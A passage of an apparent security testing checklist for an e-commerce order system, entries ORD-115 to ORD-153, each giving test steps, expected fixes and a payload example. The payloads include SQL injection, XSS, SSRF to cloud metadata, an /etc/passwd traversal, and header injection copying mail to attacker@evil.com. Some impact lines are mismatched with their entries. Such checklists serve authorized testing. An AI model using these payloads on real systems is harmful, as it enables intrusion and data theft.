**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As a vendor intercept order-related requests. 2. Attempt to modify commission_rate or payout_amount parameters. 3. Check if manipulated commission is applied.

**Expected Result:** Application must calculate commissions server-side based on predefined rules and not accept vendor-provided commission values.

**Payload Example:**

```
Change commission_rate=15 to commission_rate=1 or payout_amount=100 to payout_amount=999
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-116 — Vendor A Cancelling Vendor B's Order Items
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As Vendor A attempt to cancel order items belonging to Vendor B. 2. Modify the item_id or sub_order_id in the cancellation request. 3. Check if it processes.

**Expected Result:** Application must restrict cancellation capabilities to only the vendor's own order items.

**Payload Example:**

```
POST /api/vendor/orders/cancel-item with Vendor B's item_id using Vendor A's session
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-117 — Vendor Accessing Customer PII Across Orders
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As a vendor access customer details. 2. Check if vendor can see customer information from orders placed with other vendors. 3. Review API responses for excessive data.

**Expected Result:** Application must limit vendor access to customer information only relevant to their own fulfilled orders.

**Payload Example:**

```
GET /api/vendor/customers/C001 to check if full order history across all vendors is returned
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ORD-118 — Split Order Price Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. Place a multi-vendor order. 2. Intercept the request and modify individual vendor prices or subtotals. 3. Check if total calculation is affected.

**Expected Result:** Application must calculate all split order prices and totals server-side ignoring client-provided vendor-level pricing.

**Payload Example:**

```
Modify vendor_subtotal for one vendor while keeping total unchanged
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-119 — SQL Injection in Vendor Order Filters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As a vendor use order search or filter functionality. 2. Inject SQL payloads in filter parameters. 3. Observe response for data leakage.

**Expected Result:** Application must use parameterized queries for all vendor order search and filter operations.

**Payload Example:**

```
GET /api/vendor/orders?status=' UNION SELECT * FROM vendors-- or search=1' OR '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-120 — IDOR on Partial Shipment Status
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. View partial shipment details for own order. 2. Change order_id or shipment_id to another user's. 3. Check if other user's shipment details are accessible.

**Expected Result:** Application must verify order ownership before displaying partial shipment information.

**Payload Example:**

```
Change GET /api/shipments/SHIP-1001 to SHIP-1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-121 — Unauthorized Partial Shipment Creation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. As a regular user attempt to create a partial shipment via API. 2. Try to mark specific items as shipped. 3. Check if the operation is restricted to authorized roles.

**Expected Result:** Application must restrict shipment creation and status updates to authorized personnel only.

**Payload Example:**

```
POST /api/orders/1001/shipments with regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-122 — Marking Items Shipped Without Actual Shipment
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. As an authorized user mark items as shipped via API. 2. Check if tracking numbers or shipment validation is required. 3. Attempt to skip tracking number.

**Expected Result:** Application must require valid tracking information before marking items as shipped in partial shipments.

**Payload Example:**

```
POST /api/shipments/create with tracking_number=null or empty tracking_number
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-123 — Duplicate Partial Shipment for Same Items
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Create a partial shipment for specific items. 2. Attempt to create another partial shipment for the same items. 3. Check if duplicate shipments are allowed.

**Expected Result:** Application must track shipment status per item and prevent duplicate shipping of already-shipped items.

**Payload Example:**

```
POST /api/shipments/create for item_ids already in status=shipped
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-124 — Partial Shipment Quantity Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Create a partial shipment and intercept request. 2. Modify shipped_quantity to exceed ordered_quantity. 3. Check if over-shipping is possible.

**Expected Result:** Application must validate that shipped quantity does not exceed ordered quantity for each item.

**Payload Example:**

```
Change shipped_quantity=1 to shipped_quantity=100 for item ordered_quantity=1
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-125 — Refund Manipulation on Partial Shipment
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Request refund for unshipped items in a partially shipped order. 2. Modify refund amount to include shipped items. 3. Check if excess refund is processed.

**Expected Result:** Application must calculate refunds only for eligible unshipped items and verify amounts server-side.

**Payload Example:**

```
Modify refund to include shipped items totaling more than unshipped items' value
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-126 — Race Condition Between Partial Shipments
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Send multiple concurrent partial shipment requests for the same order. 2. Check if race condition allows over-shipping or duplicate tracking.

**Expected Result:** Application must use proper locking to prevent concurrent partial shipment conflicts.

**Payload Example:**

```
Send concurrent POST /api/shipments/create for same order with overlapping items
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ORD-127 — XSS in Shipment Notes or Tracking Updates
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Add shipment notes or tracking status updates with XSS payload. 2. View the shipment details page. 3. Check if payload executes.

**Expected Result:** Application must sanitize all shipment-related text fields to prevent stored XSS.

**Payload Example:**

```
shipment_notes=<script>alert('XSS')</script> or tracking_update=<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-128 — Email Injection in Notification Settings
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Update notification email address. 2. Inject additional email headers or recipients. 3. Check if notification emails are sent to injected addresses.

**Expected Result:** Application must sanitize email addresses and prevent header injection in notification systems.

**Payload Example:**

```
notification_email=user@test.com%0ACc:attacker@evil.com%0ABcc:spy@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-129 — IDOR on Notification Preferences
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Update notification preferences for own account. 2. Change user_id to another user's. 3. Check if notification settings for another user are modified.

**Expected Result:** Application must verify that notification preference changes are only applied to the authenticated user's account.

**Payload Example:**

```
Change PUT /api/notifications/preferences with user_id=1001 to user_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-130 — Notification Spoofing via API
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Attempt to trigger fake order status notifications via API. 2. Send crafted requests to notification endpoints with false status updates. 3. Check if notifications are sent.

**Expected Result:** Application must validate notification triggers against actual order state changes and not allow direct notification sending.

**Payload Example:**

```
POST /api/notifications/send with order_id=1001 and status=delivered (when not delivered)
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-131 — XSS in Push Notification Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. If notification content is derived from order data inject XSS in order fields. 2. Trigger notification. 3. Check if payload executes in notification display.

**Expected Result:** Application must sanitize all dynamic content in notifications before rendering in any client context.

**Payload Example:**

```
Order field with <img src=x onerror=alert(1)> that appears in notification body
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-132 — SMS Injection in Phone Notification
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Update notification phone number. 2. Inject SMS-specific payloads or multiple numbers. 3. Check if SMS is sent to unintended recipients.

**Expected Result:** Application must validate phone numbers strictly and prevent injection of additional recipients.

**Payload Example:**

```
notification_phone=+1234567890;+0987654321 or notification_phone=+1234567890%0a%0dSend money
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-133 — Notification Flooding / DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Trigger rapid state changes on an order to generate excessive notifications. 2. Check if rate limiting exists on notifications. 3. Attempt to flood user with notifications.

**Expected Result:** Application must implement rate limiting on notifications and prevent notification flooding through rapid state changes.

**Payload Example:**

```
Rapidly toggle order status to trigger 100+ notifications per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ORD-134 — Unsubscribe Link Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Use the unsubscribe link from a notification email. 2. Modify the user identifier in the unsubscribe URL. 3. Check if other users are unsubscribed.

**Expected Result:** Application must use signed or tokenized unsubscribe links that cannot be manipulated to affect other users.

**Payload Example:**

```
Change /unsubscribe?user=1001&token=abc to user=1002&token=abc
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-135 — Webhook Endpoint SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. If webhook URLs can be configured for order status notifications set URL to internal endpoint. 2. Check if internal service is accessed.

**Expected Result:** Application must validate webhook URLs against an allowlist and block requests to internal networks.

**Payload Example:**

```
webhook_url=http://127.0.0.1:3306/ or http://internal-service.local/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ORD-136 — Sensitive Data in Notification Content
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Review notification content (email/SMS/push) for sensitive data exposure. 2. Check if full order details or payment information is included in notifications.

**Expected Result:** Notifications must contain minimal information and not expose sensitive data like full payment details or addresses.

**Payload Example:**

```
Review notification for full_address; card_number; order_total; item_details exposure
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Email Client

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-137 — Notification Channel Downgrade Attack
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. If user has secure notification channel (in-app) attempt to change to insecure (SMS/email) via parameter tampering. 2. Check if downgrade is allowed without verification.

**Expected Result:** Application must verify user identity before allowing notification channel changes and warn about security implications.

**Payload Example:**

```
Change notification_channel=in_app to notification_channel=sms without re-authentication
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-138 — Broken Object Level Authorization on Batch Orders
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Submit a batch order containing multiple order items. 2. Include item IDs belonging to other users' wishlists or saved carts. 3. Check if those items are processed.

**Expected Result:** Application must validate ownership of all referenced objects in batch operations.

**Payload Example:**

```
POST /api/orders/batch with items array containing other users' saved_cart_item IDs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-139 — JWT Token Manipulation on Order Endpoint
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Decode the JWT token used for order placement. 2. Modify the user_id or role claim. 3. Re-encode and submit the request with the tampered token.

**Expected Result:** Application must validate JWT signatures server-side and reject tokens with modified claims.

**Payload Example:**

```
Modify JWT payload user_id=1001 to user_id=1002 or role=user to role=admin
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## ORD-140 — Prototype Pollution in Order Object
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. If the application uses JavaScript/Node.js inject prototype pollution payloads in order JSON body. 2. Check for unexpected behavior or privilege escalation.

**Expected Result:** Application must sanitize incoming JSON objects and prevent prototype pollution attacks.

**Payload Example:**

```
{"__proto__":{"isAdmin":true}} or {"constructor":{"prototype":{"isAdmin":true}}} in order body
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## ORD-141 — Host Header Injection on Order Confirmation
**Test Category:** HTTP Header Injection (WSTG-INPV-17) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order and intercept the request. 2. Modify the Host header to a malicious domain. 3. Check if confirmation email or redirect uses the injected host.

**Expected Result:** Application must not rely on the Host header for generating URLs in emails or responses.

**Payload Example:**

```
Host: evil.com in POST /api/orders request to check if confirmation email links use evil.com
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## ORD-142 — Clickjacking on Order Confirmation Page
**Test Category:** Clickjacking (WSTG-CLNT-09) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Create a page that iframes the order confirmation page. 2. Overlay invisible buttons over confirmation actions. 3. Check if the page can be framed.

**Expected Result:** Application must implement X-Frame-Options: DENY and Content-Security-Policy: frame-ancestors 'none' headers.

**Payload Example:**

```
<iframe src='https://target.com/order/confirmation/1001' style='opacity:0'></iframe>
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;Browser

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## ORD-143 — GraphQL Query Abuse on Order History
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. If the application uses GraphQL craft a deeply nested query to extract all order fields. 2. Attempt introspection queries. 3. Check for excessive data exposure.

**Expected Result:** Application must implement query depth limiting and field-level authorization in GraphQL endpoints.

**Payload Example:**

```
{orders{id;total;user{id;email;password;creditCards{number;cvv}}}}
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** Burp Suite;GraphQL Voyager;InQL

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## ORD-144 — Broken Function Level Authorization on Tracking Update
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. As a customer attempt to call the tracking update API meant for logistics. 2. Try to modify tracking status or add tracking events. 3. Verify role enforcement.

**Expected Result:** Application must enforce function-level authorization ensuring only logistics roles can update tracking information.

**Payload Example:**

```
POST /api/tracking/update with customer credentials body: {tracking_id:TRK-1001;status:delivered}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-145 — Double Spending via Cancel and Refund Race
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Place an order. 2. Simultaneously request cancellation with refund and use a digital product or service from the order. 3. Check if both refund and product access succeed.

**Expected Result:** Application must atomically handle cancellation and immediately revoke access to any delivered digital goods upon refund.

**Payload Example:**

```
Concurrent POST /api/orders/cancel and GET /api/orders/1001/download-digital-product
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ORD-146 — Vertical Privilege Escalation via Modification API
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. As regular user access admin-level modification endpoints. 2. Try to bypass restrictions by adding admin parameters. 3. Check for privilege escalation.

**Expected Result:** Application must enforce role-based access on all modification endpoints regardless of parameters submitted.

**Payload Example:**

```
PUT /api/admin/orders/modify with regular user token adding admin_override=true
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-147 — Business Logic Bypass Return Without Sending Item
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request and receive refund approval. 2. Never actually ship the return item. 3. Check if refund is processed without return receipt confirmation.

**Expected Result:** Application must verify physical receipt of returned items before processing refunds.

**Payload Example:**

```
POST /api/returns/confirm-refund without corresponding return_received=true status
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-148 — Insecure Deserialization in Return Data
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. If the application serializes return request data intercept and inject malicious serialized objects. 2. Submit and observe for RCE or data manipulation.

**Expected Result:** Application must validate and sanitize all deserialized data and avoid deserializing untrusted input.

**Payload Example:**

```
Inject serialized Java/PHP/Python object in return request parameters
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** Burp Suite;ysoserial

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## ORD-149 — Unauthorized Access to Other Users' Order History via Reorder
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Use the reorder API and manipulate order_id to reference another user's order. 2. Check if the reorder reveals item details from another user's order history.

**Expected Result:** Application must verify ownership of the referenced order before populating reorder details.

**Payload Example:**

```
POST /api/reorder with order_id belonging to another user to extract their order items
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-150 — SSRF via Invoice Logo URL
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. If invoice allows custom logo or image URLs intercept the request. 2. Set logo URL to an internal service. 3. Check if server-side request is made.

**Expected Result:** Application must validate image URLs and prevent SSRF by blocking internal network addresses.

**Payload Example:**

```
logo_url=http://169.254.169.254/latest/meta-data/ or logo_url=http://internal:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ORD-151 — Delivery Time Slot Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Select a delivery time slot. 2. Inject invalid or malicious values in the time_slot parameter. 3. Check for error disclosure or unexpected behavior.

**Expected Result:** Application must validate time slot selections against predefined available slots server-side.

**Payload Example:**

```
time_slot=9AM-12PM' OR '1'='1 or time_slot=../../etc/passwd
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-152 — Bypassing Gift Wrap Quantity Limits
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. If there are limits on gift wrapping per order attempt to exceed them via API. 2. Modify gift_wrap_quantity parameter. 3. Check if excess wrapping is added at no cost.

**Expected Result:** Application must enforce gift wrapping limits and pricing server-side.

**Payload Example:**

```
Change gift_wrap_quantity=1 to gift_wrap_quantity=999 with same price
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-153 — Vendor Account Takeover via Order API
